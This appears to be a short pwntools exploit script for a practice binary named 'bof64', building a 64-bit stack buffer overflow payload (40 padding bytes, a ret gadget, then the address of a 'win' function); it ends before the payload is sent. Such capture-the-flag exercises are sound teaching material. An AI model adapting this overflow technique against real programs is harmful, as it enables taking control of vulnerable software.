from pwn import *
p=process("./bof64")
elf=ELF("./bof64")

simpret = 0x040101a

payload = b"A"*40 + p64(simpret) + p64(elf.sym.win)
